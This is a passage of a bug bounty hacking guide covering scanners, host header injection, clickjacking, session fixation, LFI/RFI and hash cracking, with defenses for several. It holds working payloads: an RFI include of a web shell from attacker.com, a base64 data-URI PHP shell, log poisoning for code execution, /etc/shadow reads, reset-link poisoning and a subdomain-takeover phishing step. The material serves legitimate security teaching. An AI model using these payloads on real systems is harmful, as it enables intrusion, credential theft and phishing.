& → &amp;  < → &lt;  > → &gt;  " → &quot;

## References
- OWASP: https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input
```

### 6-2. How to Avoid Rejection

```
Common rejection reasons:

✗ "Self-XSS" — only affects your own account
  → Must impact other users

✗ "Missing security header" (informational)
  → Must prove actual exploitability

✗ "Rate limiting not implemented"
  → Need to specify actual attack scenario and impact

✗ "Out of scope"
  → Always check scope first

✗ "Already known" (duplicate)
  → Search for similar reports before submitting

✗ Not reproducible
  → Provide detailed step-by-step instructions, attach screenshots/video
```

---

## 7. Automation Tool Collection

Nuclei is a YAML template-based tool for quickly scanning web vulnerabilities. Using the public template repository maintained by ProjectDiscovery, you can detect CVEs, misconfigurations, and exposed files at scale.

```bash
# Nuclei — multi-purpose vulnerability scanner (template-based)
nuclei -u https://target.com -t cves/ -o nuclei_cves.txt
nuclei -u https://target.com -t exposures/ -severity high,critical
nuclei -l live_subs.txt -t vulnerabilities/ -rate-limit 50

# ffuf — web fuzzer
# Directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ -mc 200,301,302 -o dirs.json

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/page?FUZZ=test" -mc 200 -fs [baseline_size]

# Subdomain VHOST
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" \
     -u https://target.com -mc 200 -fs [baseline_size]

# dalfox — XSS automation
dalfox url "https://target.com/search?q=FUZZ"
dalfox file params.txt --deep-domxss

# sqlmap (authorized targets only)
sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3

# gitleaks — GitHub secrets detection
gitleaks detect --source /path/to/repo
gitleaks github --org=target-company

# trufflehog
trufflehog git https://github.com/target-org/target-repo
```

---

## 8. Bug Bounty Monetization Strategy

```
Beginner strategy:
1. Complete HackerOne Hacker101 CTF → earn private program invitations
2. Target new programs with low competition
3. Prioritize programs with broad scope
4. Focus on poorly maintained subdomains

Intermediate strategy:
1. Build automation pipeline (amass → httpx → nuclei)
2. Analyze program history (identify past report patterns)
3. Specialize in specific technology stacks (GraphQL, OAuth, JWT, etc.)
4. Chain vulnerabilities to elevate to High/Critical

Chaining examples:
SSRF (Medium) + AWS metadata access (High) + IAM credential theft (Critical)
Information disclosure (Low) + Account takeover chain (High)
```

---

## 8-2. CMS Hacking Methodology (Bug Bounty Perspective)

### WordPress Vulnerability Detection

WPScan enumerates vulnerable plugins, themes, and user accounts on WordPress sites. As the most widely used CMS, it is frequently targeted in bug bounties.

```bash
# WPScan — WordPress-specific vulnerability scanner
wpscan --url https://target.com
wpscan --url https://target.com --enumerate p  # enumerate plugins
wpscan --url https://target.com --enumerate u  # enumerate users
wpscan --url https://target.com -P wordlist.txt --username admin  # password brute-force

# Check plugin versions → search ExploitDB
wpscan --url https://target.com --enumerate p --plugins-detection aggressive

# Check XML-RPC vulnerabilities
curl -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# If XML-RPC is enabled → can be used for brute-force, SSRF, etc.
```

### Drupal / Joomla Vulnerability Detection

Droopescan enumerates the version and plugins of Drupal/Joomla CMS. Check for known RCE vulnerabilities such as Drupalgeddon.

```bash
# Droopescan — Drupal scanner
droopescan scan drupal -u https://target.com

# Joomscan — Joomla scanner
joomscan -u https://target.com

# Common CMS vulnerability discovery (Nuclei)
nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
```

### 1-Day Vulnerability Exploitation Methodology
```
1. Identify technology stack
   → Wappalyzer, WhatWeb, HTTP response header analysis

2. Determine version
   → Check paths: /readme.txt, /CHANGELOG.txt, /admin/modules
   → X-Powered-By header, Generator meta tag in HTTP response

3. Search for vulnerabilities
   → searchsploit "[CMS name] [version]"
   → https://nvd.nist.gov/vuln/search
   → https://www.exploit-db.com/
   → GitHub: site:github.com "CVE-20XX-XXXXX"

4. Obtain and test PoC
   → Search for PoC code on GitHub (beware of untrusted PoCs!)
   → Verify in a local test environment first

5. 1-day tracking strategy
   → Monitor ExploitDB RSS, Twitter threat feeds
   → Quickly scan targets after new CVE announcement (window before patching)
```

---

## 8-3. GitHub / Subdomain Takeover

Detects subdomain takeover vulnerabilities. An attacker can register subdomains whose CNAME points to a deleted external service.

```bash
# Subdomain takeover vulnerability detection
# When CNAME points to an external service but is not registered there

# Check for vulnerable patterns
dig sub.target.com CNAME
# → CNAME: some-name.github.io (GitHub Pages, unregistered)
# → CNAME: bucket.s3.amazonaws.com (S3, not created)
# → CNAME: target.herokuapp.com (Heroku, unregistered)

# Automated detection tools
subjack -w subdomains.txt -t 100 -o takeover_results.txt
subzy run --targets subdomains.txt

# GitHub Pages takeover (when CNAME is unregistered)
# 1. Create a GitHub account
# 2. Create a repository with the same name
# 3. Enable GitHub Pages
# 4. Target subdomain now points to attacker's page

# S3 bucket takeover
# 1. Create an S3 bucket with the same bucket name (same region)
# 2. Upload a phishing page
```

---

## 9. Host Header Injection

### Attack Principle
```
Occurs when the server blindly trusts and processes the HTTP Host header
→ Can be abused for password reset links, cache poisoning, SSRF, etc.
```

### Host Header Injection Techniques

Manipulate the password reset link to point to an attacker's domain via Host header injection. The link included in the email will point to the attacker's server.

```http
# 1. Password reset link manipulation
POST /reset-password HTTP/1.1
Host: attacker.com         ← tampered

Link sent in email:
https://attacker.com/reset?token=abc123  ← contains attacker domain

# 2. Using X-Forwarded-Host
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com   ← abusing proxy header

# 3. Port number injection
Host: target.com:@attacker.com

# 4. Subdomain addition
Host: attacker.com.target.com

# 5. Duplicate Host header
Host: target.com
Host: attacker.com   ← second Host may take precedence
```

### Cache Poisoning (Host Header → Web Cache Poisoning)

Web cache poisoning attack via Host header. If a CDN caches the tampered response, other users are also affected — an amplification effect.

```bash
# When a CDN/reverse proxy reflects the Host header in the response and caches it
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# If the response is cached → other users are also affected by XSS
```

### Host Header Injection Defense

Defend against Host header injection using an allowlist of permitted hosts. Always validate when generating links for password resets and similar features.

```python
# Flask: allowed host allowlist
ALLOWED_HOSTS = ['target.com', 'www.target.com']

@app.before_request
def check_host():
    if request.host not in ALLOWED_HOSTS:
        abort(400)

# Django: ALLOWED_HOSTS setting
ALLOWED_HOSTS = ['target.com', 'www.target.com']

# Hard-code password reset URL as environment variable
RESET_BASE_URL = 'https://target.com/reset'
```

---

## 10. Clickjacking

### Attack Principle
```
Place the victim site in a transparent iframe overlaid on a malicious page
to trick the user into clicking on it unknowingly.

Attack flow:
1. Attacker → create malicious page
2. Embed target.com as a transparent iframe in the page
3. Lure victim to the malicious page
4. When victim clicks a button, target.com action is performed
   (fund transfer, settings change, account deletion, etc.)
```

### Clickjacking PoC

A PoC page demonstrating a Clickjacking vulnerability. A page without X-Frame-Options or CSP frame-ancestors headers is embedded in an iframe to hijack clicks.

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    #target-frame {
      opacity: 0.0;       /* fully transparent (real attack) */
      /* opacity: 0.5;    semi-transparent for demonstration */
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
    }
    #decoy-content {
      position: absolute;
      top: 100px;
      left: 200px;
      z-index: 1;
      font-size: 24px;
    }
  </style>
</head>
<body>
  <!-- Fake button visible to the victim -->
  <div id="decoy-content">
    <h2>Claim Your Free Prize!</h2>
    <button style="padding:20px;font-size:20px">Click Here!</button>
  </div>
  
  <!-- Actual target site overlaid transparently -->
  <iframe id="target-frame"
          src="https://target.com/account/delete"
          scrolling="no">
  </iframe>
</body>
</html>
```

### Clickjacking Detection

Check for X-Frame-Options and Content-Security-Policy frame-ancestors header settings. If both headers are absent, the site is vulnerable to Clickjacking.

```bash
# Check X-Frame-Options header
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"

# Vulnerable response: no header, or
X-Frame-Options: ALLOWALL

# Safe response
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

### Clickjacking Defense

Add X-Frame-Options and CSP frame-ancestors to response headers to defend against Clickjacking.

```http
# Add server response headers
X-Frame-Options: DENY          # prohibit iframe from all sites
X-Frame-Options: SAMEORIGIN    # allow iframe only from same domain

# More flexible CSP approach (recommended)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

```javascript
// Frame busting (outdated, not recommended)
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

---

## 11. Session Fixation

### Attack Principle
```
1. Attacker → obtains their own session ID
2. Attacker → forces the victim to use that session ID
3. Victim → logs in using that session ID
4. Attacker → accesses victim's account using the same session ID
```

### Session Fixation Scenario
```
Vulnerable flow:
1. Session issued to unauthenticated user: PHPSESSID=ATTACKER_KNOWN_ID
2. Session delivered via URL parameter:
   http://target.com/login?PHPSESSID=fixed_session_id
3. Victim completes login at that URL
4. Server does not regenerate session ID after login
5. Attacker accesses victim's account using ATTACKER_KNOWN_ID
```

### Detection Method
```bash
# 1. Compare session IDs before and after login
# Before login:
Set-Cookie: session=BEFORE_LOGIN_ID

# After login:
Set-Cookie: session=BEFORE_LOGIN_ID  ← same session ID → vulnerable!
# Safe: Set-Cookie: session=AFTER_LOGIN_NEW_ID ← different ID issued

# 2. Test whether session via URL parameter is accepted
GET /login?PHPSESSID=test123 HTTP/1.1
# If test123 persists after login → Session Fixation vulnerability
```

### Session Fixation Defense

In PHP, regenerate the session ID with session_regenerate_id() after successful login. Invalidating the previous session ID prevents session fixation attacks.

```php
// PHP: always regenerate session after successful login
session_start();
// ... login validation ...
if (login_successful) {
    session_regenerate_id(true);  // issue new session ID, delete old session
    $_SESSION['user'] = $user_id;
}
```

---

## 12. LFI / RFI (File Inclusion Vulnerabilities)

### LFI (Local File Inclusion)

Read internal server files using LFI (Local File Inclusion) attacks. Include /etc/passwd, configuration files, and log files to steal sensitive information.

```bash
# Basic LFI
http://target.com/?page=../../../etc/passwd
http://target.com/?file=../../../../etc/shadow

# Encoding bypass
http://target.com/?page=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
http://target.com/?page=....//....//etc/passwd   (double slash filter bypass)

# Null byte bypass (PHP 5.3 and below)
http://target.com/?page=../../../etc/passwd%00
http://target.com/?page=../../../etc/passwd%00.jpg

# Path truncation (PHP-specific)
http://target.com/?page=../../../etc/passwd.......................

# Target file list
/etc/passwd          (user account information)
/etc/hosts           (hosts file)
/etc/ssh/sshd_config (SSH configuration)
/proc/self/environ   (environment variables — PHP code injection possible)
/var/log/apache2/access.log   (log poisoning target)
/var/log/nginx/access.log
/proc/self/fd/2      (stderr)
/var/mail/www-data
```

### LFI → RCE (Log Poisoning)

Use LFI to include server-side log files that contain injected PHP code, achieving Remote Code Execution.

```bash
# Step 1: Inject PHP code into the log file
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Execute the log file via LFI
http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id

# PHP Session file injection
# PHP session file location: /tmp/sess_[SESSION_ID]
# Save PHP code in session, then execute via LFI
```

### RFI (Remote File Inclusion)

Include malicious scripts from a remote server using RFI (Remote File Inclusion). Only works when PHP allow_url_include is enabled.

```bash
# Basic RFI (when allow_url_include=On)
http://target.com/?page=http://attacker.com/shell.php
http://target.com/?page=ftp://attacker.com/shell.php

# Content of attacker.com/shell.php
<?php system($_GET['cmd']); ?>

# RFI via SMB (Windows)
http://target.com/?page=\\attacker.com\share\shell.php

# LFI/RFI bypass using Data URI
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### LFI/RFI Defense
```php
// PHP: allowlist approach
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}

include('pages/' . $page . '.php');

// Prevent path traversal with realpath()
$base = realpath('/var/www/html/pages/');
$file = realpath($base . '/' . $page . '.php');

if (strpos($file, $base) !== 0) {
    die('Path traversal detected!');
}

// PHP configuration
// allow_url_include = Off  (block RFI)
// allow_url_fopen = Off    (block remote file access)
```

---

## 13. Password Cracking Techniques

### Offline Cracking Tools

Perform offline hash cracking with Hashcat. Using GPU acceleration, billions of hashes can be computed per second.

```bash
# Hashcat — GPU-based high-speed cracking
# MD5 cracking
hashcat -a 0 -m 0 hashes.txt wordlist.txt

# SHA-256
hashcat -a 0 -m 1400 hashes.txt wordlist.txt

# bcrypt ($2a$)
hashcat -a 0 -m 3200 hashes.txt wordlist.txt

# NTLM (Windows hashes)
hashcat -a 0 -m 1000 ntlm_hashes.txt wordlist.txt

# Rule-based (applying transformations)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force (mask attack)
hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a  (8 chars, all character types)
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d       (6-digit numbers)

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --format=md5 hashes.txt --wordlist=rockyou.txt
john --rules --wordlist=wordlist.txt hashes.txt  # apply rules
```

### Hash Identification

The hashid tool automatically identifies the algorithm type of a hash string. It can distinguish among various hash formats such as MD5, SHA-1, and bcrypt.

```bash
# Identify hash type with hashid
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# → MD5, Domain Cached Credentials

# hash-identifier
python3 hash-identifier.py

# Common hash formats
$1$   → MD5 (Linux)
$2a$  → bcrypt
$5$   → SHA-256 (Linux)
$6$   → SHA-512 (Linux)
$y$   → yescrypt
NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
```
